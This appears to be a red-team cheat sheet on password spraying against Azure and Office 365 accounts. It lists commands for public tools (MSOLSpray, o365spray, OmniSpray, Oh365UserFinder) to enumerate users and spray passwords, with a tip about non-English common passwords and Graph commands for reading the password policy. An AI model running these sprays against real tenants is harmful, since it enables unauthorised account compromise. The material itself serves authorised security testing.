___
Microsoft changes error codes and responses often, so tools often break. Its important to be tool agnostic

### Password Spraying
---

> [!NOTE] Note
> Azure does a good job at preventing easy passwords like SeasonYear! and Password123! so it may be a waste of time to spray those. HOWEVER, by default azure does not block common passwords in languages other than english.

MSOLSpray (powershell)
https://github.com/dafthack/MSOLSpray
```powershell
Invoke-MSOLSpray -UserList user.txt -Password "MegaDev79$" -Verbose
```

CaptainCredz
https://github.com/synacktiv/captaincredz
```bash

```

with **oh365userfinder**
https://github.com/dievus/Oh365UserFinder
```bash
python3 oh365userfinder.py -p <password> --pwspray --elist <listname>
```

with o365spray
https://github.com/0xZDH/o365spray
```bash
o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
```

OmniSpray
https://github.com/0xZDH/Omnispray

validate users:
```bash
python3 omnispray.py --type enum -uf users.txt --module o365_enum_office
```

Spray:
```bash
python3 omnispray.py --type spray -uf users.txt -p 'MegaDev79$' --module o365_spray_msol
```

If you're authed, you can retrieve the password policy via graph

```poweshell
Install-Module -Name Microsoft.Graph.Identity.DirectoryManagement -Scope CurrentUser -Force
```
```powershell
Import-Module Microsoft.Graph.Identity.DirectoryManagement
```

get template id
```
Get-MgGroupSetting
```

```bash
Install-Module Microsoft.Graph.Identity.DirectoryManagement
Get-MgDirectorySetting |where {$_.templateId -eq "5cf42378-d67d-4f36-ba46-e8b86229381d"} |convertto-json -Depth 50
```